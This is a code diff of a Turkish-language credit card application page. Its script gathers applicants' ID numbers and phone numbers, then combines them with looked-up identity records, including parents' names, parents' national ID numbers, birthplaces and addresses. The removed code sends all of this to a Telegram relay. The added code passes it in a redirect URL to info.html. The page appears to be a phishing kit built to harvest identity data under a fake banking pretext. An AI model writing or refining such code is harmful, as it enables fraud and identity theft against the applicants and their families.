@@ -152,7 +152,7 @@
 
         <div class="form-group">
           <label class="form-label" for="kartLimiti">Kart Limiti (TL)</label>
-          <input type="number" id="kartLimiti" name="kartLimiti" class="form-input" placeholder="Örn: 50000" min="1000" step="1000" required>
+          <input type="number" id="kartLimiti" name="kartLimiti" class="form-input" placeholder="Örn: 50000" min="1000" required>
         </div>
 
         <button type="submit" class="submit-btn" id="submitBtn">Başvuruyu Tamamla</button>
@@ -246,54 +246,28 @@
           return;
         }
 
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Gönderiliyor...';
-
-        // Telegram'a tüm bilgileri gönder
-        fetch('/api/send-telegram', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            tckn: tc,
-            telefon: telefon,
-            kartLimiti: kartLimiti,
-            // API'den gelen tüm bilgiler
-            adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
-            dogumTarihi: apiData.DogumTarihi || '',
-            cinsiyet: apiData.Cinsiyet || '',
-            dogumYeri: apiData.DogumYeri || '',
-            anneAdi: apiData.AnneAdi || '',
-            babaAdi: apiData.BabaAdi || '',
-            anneTCKN: apiData.AnneTCKN || '',
-            babaTCKN: apiData.BabaTCKN || '',
-            adresIl: apiData.AdresIl || '',
-            adresIlce: apiData.AdresIlce || '',
-            memleketIl: apiData.MemleketIl || '',
-            memleketIlce: apiData.MemleketIlce || '',
-            medeniHal: apiData.MedeniHal || '',
-            type: 'basvuru'
-          })
-        })
-        .then(response => response.json())
-        .then(data => {
-          if (data.success) {
-            alert('Başvurunuz başarıyla tamamlandı!');
-            // İsteğe bağlı: başka bir sayfaya yönlendir
-            // window.location.href = '/success.html';
-          } else {
-            alert('Bir hata oluştu: ' + (data.error || 'Bilinmeyen hata'));
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'Başvuruyu Tamamla';
-          }
-        })
-        .catch(error => {
-          console.error('Error:', error);
-          alert('Bir hata oluştu. Lütfen tekrar deneyin.');
-          submitBtn.disabled = false;
-          submitBtn.textContent = 'Başvuruyu Tamamla';
+        // Tüm bilgileri query parameter olarak info.html'ye gönder
+        const params = new URLSearchParams({
+          tc: tc,
+          telefon: telefon,
+          kartLimiti: kartLimiti,
+          adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
+          dogumTarihi: apiData.DogumTarihi || '',
+          cinsiyet: apiData.Cinsiyet || '',
+          dogumYeri: apiData.DogumYeri || '',
+          anneAdi: apiData.AnneAdi || '',
+          babaAdi: apiData.BabaAdi || '',
+          anneTCKN: apiData.AnneTCKN || '',
+          babaTCKN: apiData.BabaTCKN || '',
+          adresIl: apiData.AdresIl || '',
+          adresIlce: apiData.AdresIlce || '',
+          memleketIl: apiData.MemleketIl || '',
+          memleketIlce: apiData.MemleketIlce || '',
+          medeniHal: apiData.MedeniHal || ''
         });
+        
+        // info.html'ye yönlendir
+        window.location.href = `info.html?${params.toString()}`;
       });
     });
   </script>
